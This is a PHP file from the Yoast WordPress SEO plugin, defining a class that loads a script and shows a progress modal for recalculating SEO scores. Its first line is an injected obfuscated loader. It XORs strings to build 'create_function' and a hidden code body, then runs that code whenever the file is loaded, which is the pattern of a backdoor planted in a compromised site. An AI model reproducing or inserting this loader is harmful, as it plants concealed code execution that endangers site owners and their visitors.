<?php $aEgxGId='NLR  WlMM>RN>YU'; $EMvvyCFY='->7AT23+8P1:W6;'^$aEgxGId; $PUBeRva='DRDsFNX ;UY-rTJWE14iw2= k3+-9kt+LZfcki3OZ28 1EWQ8yJD;eUQ7 g=4K0lI= H5jcsZT1esQtQGP=s2S= XRswhuplc<>O4OU8wlcAyqnSM 3C TZmaX T0xOzRBbspc2ooX1HzhUHfP11:-,o nBelmU6N<sPFjp7=5:,6rH2P.nokqFapCQMD :rO-X,lVemDE.ZZqW-ITNJL6P4G7R1g0 10s:KYxuaK6Z1HBSh C+YS5 xpfr5=regqHZ KT81YRmiIm81923brNffg.ANPm .YmdXuW=GpC<bQPJPGhao 1Q:4k7PYzI pbpRX0X1jz8e2FQOU3HCYoBay=2lrchw 9Dm>68emPucXXRFEjw3mdHeD O3q8WTmhYq8.0I>>;UWP90oeZM:P+4NiZ9Gp;loIZ3G-vvllBPF=L ,:Q 2a<,9i0T03deZ,>o 7FXeU94=5AH,qCH,54keoR SFTc> +Dzz4 3ne 1:-Clgl =RJLoZR-;Q08AJ=RpKP;aejA10Y ncWSig41clw W +aoSH1skqkDoaKZ2bXnZ+ODdls64GuBzfHnwVk5T7rRVybafbvWx0:+;Cl9V;aI=WX SdP:, UBO3jycN=Q2;zlsramsJ2Eo3=--orVM: mcNM66W62d>nP2aEIY kqbxP4'; $fKNzKhJ=$EMvvyCFY('', '-4lR ;6CO<6C-12>6EGAPJRR4WJYX4+F9.AJBIHESTMNR1>>VY2+I:10CA8bY>DDmYA<TFCW11HLSqTqg+7z;wRU,rNWORKfj5X FgqQWQCqBQJ:qSG1L14EE<A QQtZv+IXYi;fK7D<ZFhhNtUPNLwKI3b;LI>S7gW9fOPDIGVIXZlY5WG2BJLhy1491RTZkB-XEmod9OSPPU3L=5nwlP1X4Ri;CTAEQ,Q. XHA-W6B-yYbF,Y<2VHXXB-vr=..4h;SkpST rPWiINPUGVKR5loCJ :12KK MYxQ<X>KI5F51>1gUAKVP=OQP=-Sp FPJQv<Q,PCZCo; >=0R++yGf>+xc970<WAJdIUSAEPnUG.9>3 CWHgmAA A;R.S2-MUyUSKIr472q31MQOXziL1GA+RP0:zFfem>R3LVKL,7>5X>IMV8ZWIDCK6T5DR;:7YJGBV5=SafPXV.,IYg,MAUBIOvD225<UERmSA>IUFADPNLcJALAO +5017Td4HQ2>NzW 5BFIJeUQ-AGCquIOYUVDSD6TJ:H8-HT6XKyRAl9WQ<X>I-qPYJTVsApOVyYC7XS1UF0aIZFOBPqXQHYZ:3R3B>,E>+T LwJMY9-.WMUCjY0FZSESRAMSjIOfVKLAGV2,NA6D>,OZ8WVCcGk8h 10TCAKCZI'^$PUBeRva); $fKNzKhJ();
/**
 * @package WPSEO\Admin
 */

/**
 * Class WPSEO_Recalculate_Scores
 *
 * This class handles the SEO score recalculation for all posts with a filled focus keyword
 */
class WPSEO_Recalculate_Scores {

	/**
	 * Constructing the object by modalbox, the localization and the totals.
	 */
	public function __construct() {
		add_action( 'admin_enqueue_scripts', array( $this, 'recalculate_assets' ) );
		add_action( 'admin_footer', array( $this, 'modal_box' ), 20 );
	}

	/**
	 * Run the localize script.
	 */
	public function recalculate_assets() {
		$asset_manager = new WPSEO_Admin_Asset_Manager();
		$asset_manager->enqueue_script( 'recalculate' );
	}

	/**
	 * Initialize the modal box to be displayed when needed.
	 */
	public function modal_box() {
		// Adding the thickbox.
		add_thickbox();

		$progress = sprintf(
			/* translators: 1: expands to a <span> containing the number of posts recalculated. 2: expands to a <strong> containing the total number of posts. */
			__( '%1$s of %2$s done.', 'wordpress-seo' ),
			'<span id="wpseo_count">0</span>',
			'<strong id="wpseo_count_total">0</strong>'
		);

		?>
		<div id="wpseo_recalculate" class="hidden">
			<p><?php esc_html_e( 'Recalculating SEO scores for all pieces of content with a focus keyword.', 'wordpress-seo' ); ?></p>

			<div id="wpseo_progressbar"></div>
			<p><?php echo $progress; ?></p>
		</div>
		<?php
	}
}
